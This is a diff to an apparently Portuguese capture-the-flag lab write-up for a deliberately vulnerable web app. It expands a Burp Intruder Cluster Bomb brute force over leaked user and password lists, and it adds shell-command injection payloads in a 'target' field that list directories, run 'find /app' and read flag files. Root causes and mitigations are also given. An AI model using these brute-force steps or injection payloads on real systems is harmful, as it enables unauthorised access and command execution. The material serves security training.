@@ -18,7 +18,9 @@ Fluxo tecnico:
 6. Usuario encontrado: `analyst`.
 7. Senha antiga incorreta: `analyst2022`.
 8. `GET /backup/readme.txt`.
-9. `GET /backup/password-candidates.txt`.
+9. O backup aponta para `user-candidates.txt` e `password-candidates.txt`.
+10. `GET /backup/user-candidates.txt`.
+11. `GET /backup/password-candidates.txt`.
 
 Payload de erro:
 
@@ -34,10 +36,23 @@ Payload de erro:
 Burp Intruder:
 
 1. Capture um `POST /api/auth/login`.
-2. Mantenha `username` fixo como `analyst`.
-3. Marque somente o valor de `password` como posicao.
-4. Carregue os candidatos de `password-candidates.txt`.
-5. Identifique a resposta `200`, com tamanho diferente e mensagem `Login successful`.
+2. Marque o valor de `username` como primeira posicao.
+3. Marque o valor de `password` como segunda posicao.
+4. Use ataque `Cluster Bomb`.
+5. Carregue `user-candidates.txt` como Payload set 1.
+6. Carregue `password-candidates.txt` como Payload set 2.
+7. Identifique a resposta `200`, com tamanho diferente e mensagem `Login successful`.
+
+Corpo conceitual:
+
+```json
+{
+  "username": "§user§",
+  "password": "§password§",
+  "client": "web",
+  "returnUrl": "/dashboard.html"
+}
+```
 
 Credencial final:
 
@@ -51,7 +66,7 @@ Causa raiz:
 - stack trace/path disclosure;
 - parametro client-side nao validado adequadamente;
 - arquivos legados publicados no webroot;
-- backup publico com lista de senhas candidatas;
+- backup publico com listas de usuarios e senhas candidatas;
 - falta de rotacao/remocao de credenciais.
 
 Mitigacao:
@@ -61,7 +76,7 @@ Mitigacao:
 - validar `returnUrl` com allowlist;
 - nao expor caminhos internos;
 - remover arquivos sensiveis do webroot;
-- nunca publicar listas de senhas;
+- nunca publicar listas de usuarios ou senhas;
 - rotacionar credenciais expostas;
 - implementar rate limiting e lockout em login real.
 
@@ -69,6 +84,10 @@ Mitigacao:
 
 ```text
 target: 127.0.0.1; whoami
+target: 127.0.0.1; pwd
+target: 127.0.0.1; ls -la
+target: 127.0.0.1; ls -la /app
+target: 127.0.0.1; find /app -maxdepth 3 -type f 2>/dev/null
 target: 127.0.0.1; cat /app/flags/flag1.txt
 target: 127.0.0.1; sleep 5; #
 target: localhost && cat /app/flags/flag2.txt
@@ -131,7 +150,43 @@ Prova de execucao:
 }
 ```
 
-Leitura da flag:
+Enumeracao controlada:
+
+```json
+{
+  "assetId": "gw-01",
+  "checkType": "icmp",
+  "target": "127.0.0.1; pwd"
+}
+```
+
+```json
+{
+  "assetId": "gw-01",
+  "checkType": "icmp",
+  "target": "127.0.0.1; ls -la"
+}
+```
+
+```json
+{
+  "assetId": "gw-01",
+  "checkType": "icmp",
+  "target": "127.0.0.1; ls -la /app"
+}
+```
+
+```json
+{
+  "assetId": "gw-01",
+  "checkType": "icmp",
+  "target": "127.0.0.1; find /app -maxdepth 3 -type f 2>/dev/null"
+}
+```
+
+Esse caminho confirma execucao, mostra o contexto do processo e encontra arquivos de interesse sem comandos destrutivos.
+
+Leitura da flag encontrada:
 
 ```json
 {
